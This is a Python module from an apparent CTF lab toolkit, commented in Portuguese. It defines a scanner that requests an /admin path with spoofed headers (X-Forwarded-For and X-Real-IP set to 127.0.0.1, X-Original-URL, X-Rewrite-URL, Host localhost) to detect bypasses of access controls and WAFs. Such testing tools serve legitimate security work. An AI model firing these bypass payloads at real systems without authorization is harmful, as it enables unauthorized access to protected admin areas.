"""
domains/detection/header_injection.py — Scanner de Header Injection e Bypasses.

Testa manipulação de cabeçalhos Host, X-Forwarded-For e Rewrite para
burlar controles de acesso e WAFs.
"""

from typing import Iterable, Any
from ctflab.core.scanner import BaseScanner
from ctflab.core.models import ScanResult
from ctflab.core import http as H

class HeaderInjectionScanner(BaseScanner):
    name = "header_injection"
    capabilities = ["http", "bypass", "detection"]
    
    PAYLOADS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "localhost"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"Host": "localhost"},
    ]
    
    def __init__(self, ctx, path: str = "/admin"):
        super().__init__(ctx)
        self.path = path

    def get_payloads(self) -> Iterable[dict]:
        return self.PAYLOADS

    def execute(self, payload: dict) -> Any:
        # Força use_cache=False para garantir detecção real de bypass
        return H.get(self.ctx.session, self.path, headers=payload, use_cache=False)

    def analyze(self, payload: dict, response: Any) -> ScanResult:
        # Hit se retornar 200 (bypass de 403) ou se 'admin' aparecer na resposta
        hit = response.status_code == 200 or "admin" in response.text.lower()
        
        if hit:
            return ScanResult(
                success=True,
                confidence=0.9,
                details=f"Bypass detectado via headers: {payload}",
                severity="High"
            )
            
        return ScanResult(success=False, confidence=0.0, details="-")
